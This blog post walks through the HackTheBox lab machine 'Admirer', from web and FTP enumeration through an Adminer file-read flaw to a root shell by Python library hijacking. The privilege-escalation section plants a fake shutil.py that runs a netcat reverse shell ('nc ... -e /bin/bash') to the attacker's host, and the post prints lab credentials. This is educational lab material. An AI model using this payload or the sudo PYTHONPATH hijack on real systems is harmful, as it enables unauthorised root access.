---
layout: post
title: "HackTheBox - Admirer"
description: "Walkthrough of Admirer box on Hackthebox."
thumb_image: "documentation/admirerthumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/admirer.webp"
path-detail="documentation/admirer.webp"
alt="HTB Admirer" %}

## HTB - Admirer

IP - 10.10.10.187

### Overview

This box was an easy level linux box on HTB created by [polarbearer](https://www.hackthebox.eu/home/users/profile/159204) and [GibParadox](https://www.hackthebox.eu/home/users/profile/125033), it started with finding a hidden directory in `robots.txt` named `admin-dir`, in which we find two txt files namely `contacts.txt` and `credentials.txt` using a gobuster scan with `-x txt`, then we use `ftpuser` creds obtained from `credentials.txt` to login to `FTP`. FTP server had the old source code of the website and on enumerating it we find a reference to using some open source database management utility, for out box it was `adminer`. On googling adminer exploits we find a exploit that let us read local files, we use that exploit to read `index.php` file, which had `creds`, we can use those creds to ssh as user `waldo`, root part was fun and it was a `Python Library Hijacking`.


### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
nmap -sC -sV -oA nmap/results 10.10.10.187
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-24 00:40 IST
Nmap scan report for 10.10.10.187
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.61 seconds
{% endhighlight %}

Open services are SSH on port 22, webserver on port 80 and a FTP server on port 21. I checked for Anonymous access on the FTP server but it wasn’t allowed, so I am gonna shift my focus on the webserver.

#### Enumerating the web server

The site looks like an image gallery.

{% include image.html path="documentation/admirerweb.webp"
path-detail="documentation/admirerweb.webp"
alt="HTB Admirer" %}

Alright let’s run something on backend and start exploring the website, because `we always want to keep some enumeration running while we manually look at that web server` ~~Told ya already, I am a ippsec fanboi~~. So firing up the gobuster scan to find hidden directories, and I am also looking for txt and php files(incase we find some notes or some hidden webpage).

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
└──╼ $gobuster dir -u http://10.10.10.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_result -t 120
{% endhighlight %} 

#### Initial Foothold

During basic enumeration, I found a hidden directory in `/robots.txt` named `/admin-dir` but we can’t browse files in it, as the first gobuster scan wasn’t really fruitful so, I ran another gobuster scan in admin-dir directory and searching for `txt` and `php` files. `Note : robots.txt also had a username "waldo"`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
└──╼ $gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_result -t 120
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir
[+] Threads:        120
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/09/25 19:53:55 Starting gobuster
===============================================================
/contacts.txt
/credentials.txt
{% endhighlight %} 

And got two files `contacts.txt` & `credentials.txt`, `contacts.txt` had some emails and names and it was a nice rabbit hole, but in `credentials.txt` we found the ftp user’s credential.

{% include image.html path="documentation/admirercred.webp"
path-detail="documentation/admirercred.webp"
alt="HTB Admirer" %}

`ftpuser : %n?4Wz}R$tTF7`

#### Foothold

As now we have the creds of the `FTP` user, lets start enumerating that.
{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
└──╼ $ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:fumenoid): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
{% endhighlight %} 

I simply downloaded all the files in the ftp server to analyse them.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer/ftp]
└──╼ $ls -la
total 7168
drwxr-xr-x 1 fumenoid fumenoid     158 Jul 24 03:36 .
drwxr-xr-x 1 fumenoid fumenoid     148 Jul 24 03:46 ..
drwxr-x--- 1 fumenoid fumenoid      34 Jun  7  2019 assets
-rw-r--r-- 1 fumenoid fumenoid    3405 Jul 24 03:16 dump.sql
-rw-r--r-- 1 fumenoid fumenoid 7321600 Jul 24 03:17 html.tar
drwxr-x--- 1 fumenoid fumenoid      22 Dec  3  2019 images
-rw-r----- 1 fumenoid fumenoid    4613 Dec  4  2019 index.php
-rw-r----- 1 fumenoid fumenoid     134 Dec  2  2019 robots.txt
drwxr-x--- 1 fumenoid fumenoid      92 Dec  2  2019 utility-scripts
drwxr-x--- 1 fumenoid fumenoid      54 Dec  2  2019 w4ld0s_s3cr3t_d1r
{% endhighlight %} 

And it looks like backup of the code running on the webserver, In it there were many rabbit holes and a lot of passwords of mysql database, I tried using them with username `waldo` to ssh into the server but none of those passwords worked D:

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer/ftp/utility-scripts]
└──╼ $cat db_admin.php 
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
{% endhighlight %} 

In this file there is a `TODO` note, and as `db.php` is not present on current webserver, I assumed the box has some open source db management utility. After some basic enumeration I figured they are using `Adminer`, _the box name is based on this_.

### Getting User

I tried the passwords from the ftp directory in the adminer console, that was at `http://10.10.10.187/utility-scripts/adminer.php` but none of them worked D:

{% include image.html path="documentation/admireradminer.webp"
path-detail="documentation/admireradminer.webp"
alt="HTB Admirer" %}

Then I googled for Adminer’s exploit and reached [here](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool), It’s a poc of an exploit that can be used to load local files on the server.

For this we also need to allow remote access on mysql in our machine, I used this [blog](https://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html) to do it. Also thanks to `pop_eax` and `kreep` for giving me a nudge on this part. _Ngl mysql part was a bit annoying._

Now we can use that above exploit to load files, I opened up `index.php` file in the source code and finally got the creds of the user waldo. `waldo : &<h5b~yK3F#{PaPB&dA}{H>` Now we can simply use these creds to SSH into the box.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
└──╼ $ssh waldo@10.10.10.187
waldo@10.10.10.187 password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ id
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
waldo@admirer:~$ wc -c user.txt 
33 user.txt
waldo@admirer:~$
{% endhighlight %} 

_Sorry that I didn’t explain this part properly, I didn’t documented this box while initially doing it and I don’t want to solve this box again but I simply followed this blog to setup a remote mysql server and the exploit’s poc to load index.php file which had creds, so I guess writing them again won’t be really helpful._

### Rooting the box

Alright, we are on the box as user `waldo` and we also have his password, so the first thing to check is for `sudo` perms.

{% highlight bash %}
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
{% endhighlight %} 

Let’s check what perms on `/opt/scripts/admin_tasks.sh` file.

{% highlight bash %}
waldo@admirer:~$ ls -la /opt/scripts/admin_tasks.sh
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 /opt/scripts/admin_tasks.sh
{% endhighlight %} 

Ah.. we don’t have writeperm on that file D:<br>
Alright, let’s read the code and analyse it.

{% highlight bash %}
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
{% endhighlight %} 

Seems like we can run some simple checks as well as do some basic backup operations, tho intresting part is the web backup, as here we are calling running a python script.

{% highlight bash %}
...
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &  # A PYTHON SCRIPT 
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
...
{% endhighlight %} 

On checking that python script, we can see it is importing an additional library named `shutil`.

{% highlight bash %}
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
{% endhighlight %} 

Which means we can do a `Python library hijacking`, here is two blogs, by [rastating](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) and a medium blog by [klockw3rk](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7) that I refered to, to understand the basic concept.

Alright so first I created a fake library named `shutil.py` with a function `make_archive` in `/tmp` directory which had our reverse shell payload.

{% highlight bash %}
waldo@admirer:/tmp$ mkdir temp
waldo@admirer:/tmp$ cd temp
waldo@admirer:/tmp/temp$ vi shutil.py
waldo@admirer:/tmp/temp$ cat shutil.py 
#!/usr/bin/python3

def make_archive(x,y,z):
	import os
	os.system("nc 10.10.14.19 9889 -e /bin/bash")
{% endhighlight %} 

Starting the nmap listener on local machine `rlwrap nc -lvnp 9889`. And then execute our `admin_tasks.sh` script with option 6 but main point is, we need to export `pythonpath` as pwd i.e `/tmp/temp` folder so that the script uses our `fake shutil` library/module.

{% highlight bash %}
waldo@admirer:/tmp/temp$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
{% endhighlight %} 

Looking at our rev shell, and yes we got a connection.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Admirer]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.187] 42894
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/tmp/temp
cd /root
wc -c root.txt
33 root.txt
{% endhighlight %} 

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.